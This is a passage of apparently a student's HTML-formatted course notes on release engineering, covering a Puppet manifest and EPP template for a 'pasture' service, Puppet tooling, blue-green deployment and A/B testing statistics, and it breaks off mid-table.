&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# parametrize&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;pasture&lt;/span&gt; (&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$port&lt;/span&gt;                = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;80&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$default_character&lt;/span&gt;   = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;sheep&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$default_message&lt;/span&gt;     = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_config_file&lt;/span&gt; = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;/etc/pasture_config.yaml&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$sinatra_server&lt;/span&gt;      = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;webrick&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;){&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;package&lt;/span&gt; { &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;ensure&lt;/span&gt;   =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;present&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;provider&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;gem&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;before&lt;/span&gt;   =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;File&lt;/span&gt;[&lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_config_file],&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;  # pasture resource comes before this file&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_config_hash&lt;/span&gt; = {&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt;              =&amp;gt; &lt;span style=&#34;color:#40ffff&#34;&gt;$port,&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;default_character&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#40ffff&#34;&gt;$default_character,&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;default_message&amp;#39;&lt;/span&gt;   =&amp;gt; &lt;span style=&#34;color:#40ffff&#34;&gt;$default_message,&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;sinatra_server&amp;#39;&lt;/span&gt;    =&amp;gt; &lt;span style=&#34;color:#40ffff&#34;&gt;$sinatra_server,&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;file&lt;/span&gt; { &lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_config_file:&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;    # source  =&amp;gt; &amp;#39;puppet:///modules/pasture/pasture_config.yaml&amp;#39;,  # hard coded in files/pasture_config.yaml&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;content&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#bbb&#34;&gt;epp&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture/pasture_config.yaml.epp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_config_hash),&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;  # templates/pasture_config.yaml.epp&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;notify&lt;/span&gt;  =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;Service&lt;/span&gt;[&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;  # when this config resource is updated, restart the pasture service&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;file&lt;/span&gt; { &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;/etc/systemd/system/pasture.service&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;    # source  =&amp;gt; &amp;#39;puppet:///modules/pasture/pasture.service&amp;#39;,  # hard coded&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;content&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#bbb&#34;&gt;epp&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture/pasture.service.epp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#40ffff&#34;&gt;$pasture_service_hash),&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt; # templates/pasture.service.epp&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;notify&lt;/span&gt;  =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;Service&lt;/span&gt;[&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;service&lt;/span&gt; { &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;ensure&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;running&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;  # unless statement is also supported&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#40ffff&#34;&gt;$sinatra_server&lt;/span&gt; == &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;thin&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#bbb&#34;&gt;or&lt;/span&gt; (&lt;span style=&#34;color:#40ffff&#34;&gt;$sinatra_server&lt;/span&gt; == &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;mongrel&amp;#39;&lt;/span&gt;)  {&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;package&lt;/span&gt; { &lt;span style=&#34;color:#40ffff&#34;&gt;$sinatra_server:&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#bbb&#34;&gt;provider&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;gem&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;notify&lt;/span&gt;   =&amp;gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;Service&lt;/span&gt;[&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;}&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Templates&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;variables defined at the top (provided via a hash on the pp side)&lt;/li&gt;
&lt;li&gt;usage of variables using &lt;code&gt;&amp;lt;%= $VAR%&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-epp&#34; data-lang=&#34;epp&#34;&gt;&amp;lt;%- | $port,
      $default_character,
      $default_message,
      $sinatra_server,
| -%&amp;gt;
# This file is managed by Puppet. Please do not make manual changes.
---
:default_character: &amp;lt;%= $default_character %&amp;gt;
:default_message:   &amp;lt;%= $default_message %&amp;gt;
:sinatra_settings:
  :port: &amp;lt;%= $port %&amp;gt;
  :server: &amp;lt;%= $sinatra_server %&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;facter&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;get facts about a system when requesting a catalog&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: include custom facts&lt;/li&gt;
&lt;li&gt;&lt;code&gt;facter -p os.family&lt;/code&gt;: drill down&lt;/li&gt;
&lt;li&gt;manifests can access facts using &lt;code&gt;$facts[&#39;fact_name&#39;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puppet job&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;trigger puppet across multiple nodes remotely without needing to ssh manually&lt;/li&gt;
&lt;li&gt;need to be logged in &lt;code&gt;puppet access login --lifetime 1d&lt;/code&gt; (use RBAC to create users)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puppet job run --nodes pasture-dev.puppet.vm,pasture-prod.puppet.vm&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[sudo] journalctl -u pasture -e
&lt;ul&gt;
&lt;li&gt;view logs for specific service unit &lt;code&gt;-u&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;the &lt;code&gt;-e&lt;/code&gt; jumps to the end of the file&lt;/li&gt;
&lt;li&gt;to read a file starting from the bottom use &lt;code&gt;less +G file.log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Forge
&lt;ul&gt;
&lt;li&gt;community maintained modules&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puppet module install puppetlabs-postgresql&lt;/code&gt; installs the module &lt;code&gt;postgresql&lt;/code&gt; to the modules directory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A profile is a class that declares one or more related component modules and sets their parameters as needed. The set of profiles on a system defines and configures the technology stack it needs to fulfill its business role.
&lt;ul&gt;
&lt;li&gt;The purpose of profiles is to avoid duplicating parameters when including a class for various nodes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A role is a class that combines one or more profiles to define the desired state for a whole system. A role should correspond to the business purpose of a server&lt;/li&gt;
&lt;li&gt;Hiera: built-in data lookup. Use the &lt;code&gt;lookup(..)&lt;/code&gt; and define variables in &lt;code&gt;data/common&lt;/code&gt;, &lt;code&gt;data/domain&lt;/code&gt; and &lt;code&gt;data/nodes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;control repository: for setting up puppet from a git repo
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;puppet code deploy production --wait&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Puppetfile: manages external dependencies &lt;code&gt;mod &amp;quot;puppetlabs/postgresql&amp;quot;, &#39;5.12.1&#39;&lt;/code&gt;. Requires a tool to get the entire tree&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;deployment-and-mitigating-failures&#34; &gt;Deployment and Mitigating Failures
&lt;span&gt;
    &lt;a href=&#34;#deployment-and-mitigating-failures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Integrate (push patches to git server) → Build (from source code) → &lt;strong&gt;Deploy (new) → Monitor (new ideas for patches)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Deployment is a systematic process for making official version of software available&lt;/li&gt;
&lt;li&gt;Release pipelines require experts; DevOps / Release engineers / operators&lt;/li&gt;
&lt;li&gt;Release engineers increase the market potential of software organizations
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Investment in release engineering has enabled Mozilla to compete with software giants like Microsoft, Google, and Apple&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Release strategy
&lt;ul&gt;
&lt;li&gt;Send compiled software to production team for etching on to shipment media&lt;/li&gt;
&lt;li&gt;Upload tarball to location on web&lt;/li&gt;
&lt;li&gt;Push changes into package repository like Maven Centra or NPM&lt;/li&gt;
&lt;li&gt;Upload new release to an app store like Google Play or Apple Store&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;blue-green-deployment&#34; &gt;Blue-Green Deployment
&lt;span&gt;
    &lt;a href=&#34;#blue-green-deployment&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://martinfowler.com/bliki/BlueGreenDeployment.html&#34;&gt;Blue-Green Deployment by Martin Fowler&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Blue-green deployment tackles the challenge of minimizing downtime when automating deployment&lt;/li&gt;
&lt;li&gt;The challenge is addressed by ensuring there are two as-identical production environments and the latest version is deployed to the idle environment for testing before switching the router to target the blue environment&lt;/li&gt;
&lt;li&gt;Roll-over/backs can be done by first running the application in read-only mode for some time before running it in read-write mode.&lt;/li&gt;
&lt;li&gt;Speaking on disaster-readiness, since one environment is running a previous version or the staging version, this approach is equivalent to what would be needed in case of a disaster.&lt;/li&gt;
&lt;li&gt;Trickiest tier from (web, app, database services) to maintain in blue-green architecture is the database service since there can be two different schemas for the database. To integrate it, the first scheme modification has to support both versions, and only when the old version is deprecated, should the schema support for it should be removed&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ab-testing&#34; &gt;A/B Testing
&lt;span&gt;
    &lt;a href=&#34;#ab-testing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;An experimental design has subjects in a control group which does not receive treatment and are a baseline behaviour and a treatment group which receive a single change and a hypothesis was made. Subjects are randomly assigned to a control group or a treatment group.&lt;/p&gt;
&lt;p&gt;Hypothesis formulation is to improve a bottom line measurement such as the click through rate. Two versions of the application are deployed and tested against.&lt;/p&gt;
&lt;p&gt;Statistical hypothesis testing:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;want to disprove something not accept something (null hypotheses)
&lt;ul&gt;
&lt;li&gt;in software: click through rates on ads, performance (memory, CPU, I/O, network)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;used to check if two samples are derived from the same distribution&lt;/li&gt;
&lt;li&gt;statistical test is a &lt;em&gt;p-value&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;compare p-value to alpha (threshold) value&lt;/li&gt;
&lt;li&gt;if the p-value is less than alpha, the null hypothesis should be rejected
&lt;ul&gt;
&lt;li&gt;Fisher&amp;rsquo;s test: null hypothesis is that the lady cannot detect milk-first&lt;/li&gt;
&lt;li&gt;Hypergeometric distribution: determine what what probability of high success is like (e.g. meeting something that would otherwise be 5%)&lt;/li&gt;
&lt;li&gt;Software: click-through rate in A and B are drawn from the same population&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Contingency table:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;Session w/ clicks&lt;/th&gt;
          &lt;th&gt;Sessions w/o clicks&lt;/th&gt;
